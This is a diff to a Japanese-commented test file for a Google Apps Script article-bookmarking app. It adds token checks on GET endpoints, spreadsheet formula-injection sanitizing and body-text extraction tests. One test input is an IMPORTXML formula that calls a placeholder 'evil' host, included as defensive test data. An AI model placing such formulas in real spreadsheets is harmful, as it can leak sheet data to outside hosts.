@@ -248,22 +248,22 @@ function callDoPost(context, bodyObj) {
   return JSON.parse(output.getContent());
 }
 
-/** doGet を ?action=list&category=... 相当のパラメータで呼び、レスポンスJSONを返す */
-function callDoGetList(context, category) {
-  const e = { parameter: { action: 'list', category: category } };
+/** doGet を ?action=list&category=...&token=... 相当のパラメータで呼び、レスポンスJSONを返す */
+function callDoGetList(context, category, token) {
+  const e = { parameter: { action: 'list', category: category, token: token } };
   const output = context.doGet(e);
   return JSON.parse(output.getContent());
 }
 
-/** doGet を ?action=categories で呼び、レスポンスJSONを返す */
-function callDoGetCategories(context) {
-  const output = context.doGet({ parameter: { action: 'categories' } });
+/** doGet を ?action=categories&token=... で呼び、レスポンスJSONを返す */
+function callDoGetCategories(context, token) {
+  const output = context.doGet({ parameter: { action: 'categories', token: token } });
   return JSON.parse(output.getContent());
 }
 
 // ---- 正常系 --------------------------------------------------
 
-test('正常系: タイトル取得 → ナレッジ/カテゴリ/ に日付+タイトル.md で保存される', () => {
+test('正常系: タイトル取得 → ナレッジ/カテゴリ/ に「タイトル_日付」のドキュメントで保存される', () => {
   const { context, rootFolder } = loadGasScript({
     fetchImpl: () => makeFetchResponse({ body: '<html><head><title>テスト記事のタイトル</title></head></html>' })
   });
@@ -272,7 +272,7 @@ test('正常系: タイトル取得 → ナレッジ/カテゴリ/ に日付+タ
 
   assert.strictEqual(result.ok, true);
   assert.strictEqual(result.title, 'テスト記事のタイトル');
-  assert.match(result.fileName, /^テスト記事のタイトル_\d{4}-\d{2}-\d{2}\.md$/);
+  assert.match(result.fileName, /^テスト記事のタイトル_\d{4}-\d{2}-\d{2}$/);
   assert.strictEqual(result.folderPath, 'ナレッジ/PC系');
 
   // Drive 側の実体を確認: ナレッジ → PC系 → ファイル1件
@@ -323,7 +323,7 @@ test('正常系: 同名ファイルが既にある場合は時刻付きの別名
   const files = rootFolder.subFolders[0].subFolders[0].files;
   assert.strictEqual(files.length, 2, '2ファイルとも保存される');
   assert.notStrictEqual(files[0].name, files[1].name, 'ファイル名が衝突しない');
-  assert.match(files[1].name, /^同じタイトル_\d{4}-\d{2}-\d{2}_\d{6}\.md$/);
+  assert.match(files[1].name, /^同じタイトル_\d{4}-\d{2}-\d{2}_\d{6}$/);
 });
 
 // ---- タイトル取得のフォールバック -----------------------------
@@ -391,7 +391,7 @@ test('sanitizeFileName_: Windows禁止文字がスペースに置換される', 
 
 test('buildFileName_: 空タイトルは「無題」になる', () => {
   const { context } = loadGasScript();
-  assert.strictEqual(context.buildFileName_('', '2026-07-12'), '無題_2026-07-12.md');
+  assert.strictEqual(context.buildFileName_('', '2026-07-12'), '無題_2026-07-12');
 });
 
 test('buildFileName_: 長すぎるタイトルは切り詰められる', () => {
@@ -399,12 +399,12 @@ test('buildFileName_: 長すぎるタイトルは切り詰められる', () => {
   const longTitle = 'あ'.repeat(200);
   const name = context.buildFileName_(longTitle, '2026-07-12');
   assert.ok(name.length < 100, '切り詰め後のファイル名が十分短い: ' + name.length);
-  assert.match(name, /^あ+…_2026-07-12\.md$/);
+  assert.match(name, /^あ+…_2026-07-12$/);
 });
 
 test('buildFileName_: タイトルが先頭、日付が末尾になる（Drive一覧でタイトルが読みやすいように）', () => {
   const { context } = loadGasScript();
-  assert.strictEqual(context.buildFileName_('記事タイトル', '2026-07-12'), '記事タイトル_2026-07-12.md');
+  assert.strictEqual(context.buildFileName_('記事タイトル', '2026-07-12'), '記事タイトル_2026-07-12');
 });
 
 // ---- 異常系（入力バリデーション） ------------------------------
@@ -891,4 +891,112 @@ test('doPost: 同名記事の重複判定はGoogleドキュメントに対して
   const files = rootFolder.subFolders[0].subFolders[0].files;
   assert.strictEqual(files.length, 2, '2件ともドキュメントとして保存される');
   assert.notStrictEqual(files[0].name, files[1].name, 'ファイル名（ドキュメントのタイトル）が衝突しない');
+});
+
+// ---- GET系APIの合言葉検証（レビュー指摘🔴1の回帰テスト） -----------
+// 記事一覧はタイトル・URL・メモといった個人の閲覧記録に近い情報を含むため、
+// WebアプリのURLを知られただけでは読めないよう、GETもPOSTと同じ合言葉で保護する。
+
+test('GET保護: SHARED_TOKEN設定時、tokenなしのlistは拒否される', () => {
+  const { context } = loadGasScript({ scriptProperties: { SHARED_TOKEN: 'himitsu' } });
+  const result = callDoGetList(context, 'PC系', undefined);
+  assert.strictEqual(result.ok, false);
+  assert.match(result.error, /合言葉が一致しません/);
+});
+
+test('GET保護: SHARED_TOKEN設定時、token不一致のcategoriesは拒否される', () => {
+  const { context } = loadGasScript({ scriptProperties: { SHARED_TOKEN: 'himitsu' } });
+  const result = callDoGetCategories(context, 'wrong');
+  assert.strictEqual(result.ok, false);
+  assert.match(result.error, /合言葉が一致しません/);
+});
+
+test('GET保護: 正しいtokenならlist/categoriesとも通る', () => {
+  const { context } = loadGasScript({ scriptProperties: { SHARED_TOKEN: 'himitsu' } });
+  callDoPost(context, { url: 'https://example.com/a', category: 'PC系', token: 'himitsu' });
+
+  const list = callDoGetList(context, 'PC系', 'himitsu');
+  assert.strictEqual(list.ok, true);
+  assert.strictEqual(list.items.length, 1);
+
+  const categories = callDoGetCategories(context, 'himitsu');
+  assert.strictEqual(categories.ok, true);
+});
+
+test('GET保護: SHARED_TOKEN未設定ならtokenなしでも通る（従来挙動の維持）', () => {
+  const { context } = loadGasScript();
+  const result = callDoGetCategories(context, undefined);
+  assert.strictEqual(result.ok, true);
+});
+
+test('GET保護: tokenなしでも稼働確認メッセージ(actionなし)は返る', () => {
+  const { context } = loadGasScript({ scriptProperties: { SHARED_TOKEN: 'himitsu' } });
+  const output = context.doGet({ parameter: {} });
+  const result = JSON.parse(output.getContent());
+  assert.strictEqual(result.ok, true, '稼働確認は情報を含まないため合言葉不要');
+});
+
+// ---- Sheets数式インジェクション対策（レビュー指摘🔴4の回帰テスト） ---
+
+test('sanitizeCellText_: 先頭が = の文字列にはアポストロフィが付く', () => {
+  const { context } = loadGasScript();
+  assert.strictEqual(context.sanitizeCellText_('=IMPORTXML("http://evil/","//a")'), "'=IMPORTXML(\"http://evil/\",\"//a\")");
+  assert.strictEqual(context.sanitizeCellText_('+1+1'), "'+1+1");
+});
+
+test('sanitizeCellText_: 通常の文字列はそのまま', () => {
+  const { context } = loadGasScript();
+  assert.strictEqual(context.sanitizeCellText_('普通のタイトル'), '普通のタイトル');
+  assert.strictEqual(context.sanitizeCellText_(''), '');
+});
+
+test('doPost: メモが数式で始まる場合、Sheetsにはアポストロフィ付きで書き込まれる', () => {
+  const { context, spreadsheetsById } = loadGasScript({
+    fetchImpl: () => makeFetchResponse({ body: '<title>数式入りメモの記事</title>' })
+  });
+  callDoPost(context, { url: 'https://example.com/f', category: 'PC系', memo: '=1+1' });
+
+  const rows = Object.values(spreadsheetsById)[0]._sheet._rows;
+  assert.strictEqual(rows[1][4], "'=1+1", 'メモ列は数式として解釈されない形で格納される');
+});
+
+// ---- 本文抽出の改善（レビュー指摘🟡6の回帰テスト） ------------------
+
+test('extractBodyText_: nav/header/footer/aside内のテキストは除去される', () => {
+  const { context } = loadGasScript();
+  const html = '<body><nav>メニュー ランキング</nav><header>サイトヘッダー</header>' +
+    '<p>これが本文です。</p><aside>広告です</aside><footer>フッター情報</footer></body>';
+  const text = context.extractBodyText_(html);
+  assert.doesNotMatch(text, /メニュー ランキング/);
+  assert.doesNotMatch(text, /サイトヘッダー/);
+  assert.doesNotMatch(text, /広告です/);
+  assert.doesNotMatch(text, /フッター情報/);
+  assert.match(text, /これが本文です。/);
+});
+
+test('extractBodyText_: <article>があればその中身だけが本文になる', () => {
+  const { context } = loadGasScript();
+  const html = '<body><div>サイドバーのおすすめ記事一覧</div>' +
+    '<article><h1>記事見出し</h1><p>記事の本文段落。</p></article>' +
+    '<div>関連記事リスト</div></body>';
+  const text = context.extractBodyText_(html);
+  assert.match(text, /記事見出し/);
+  assert.match(text, /記事の本文段落。/);
+  assert.doesNotMatch(text, /サイドバーのおすすめ記事一覧/);
+  assert.doesNotMatch(text, /関連記事リスト/);
+});
+
+test('extractBodyText_: articleが無ければページ全体からの抽出にフォールバックする', () => {
+  const { context } = loadGasScript();
+  const html = '<body><div><p>タグ構造が古いサイトの本文。</p></div></body>';
+  const text = context.extractBodyText_(html);
+  assert.match(text, /タグ構造が古いサイトの本文。/);
+});
+
+// ---- コード品質の回帰チェック（レビュー指摘🔴3） ---------------------
+
+test('Code.gs: checkToken_ の定義がちょうど1つである（重複定義の再発防止）', () => {
+  const source = fs.readFileSync(path.join(__dirname, '..', 'gas', 'Code.gs'), 'utf8');
+  const definitions = source.match(/function checkToken_\(/g) || [];
+  assert.strictEqual(definitions.length, 1);
 });
